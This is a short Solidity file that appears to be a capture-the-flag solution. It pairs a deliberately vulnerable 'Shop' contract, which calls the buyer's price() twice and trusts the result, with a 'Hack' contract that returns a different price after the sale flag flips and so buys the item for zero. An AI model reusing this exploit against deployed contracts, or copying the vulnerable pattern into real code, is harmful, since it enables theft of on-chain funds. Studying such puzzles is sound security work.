// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        IBuyer _buyer = IBuyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Hack {
    Shop public target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function price() public view returns (uint256) {
        if (!target.isSold()) {
            return 100;
        }
        return 0;
    }

    function hack() public {
        target.buy();
    }
}
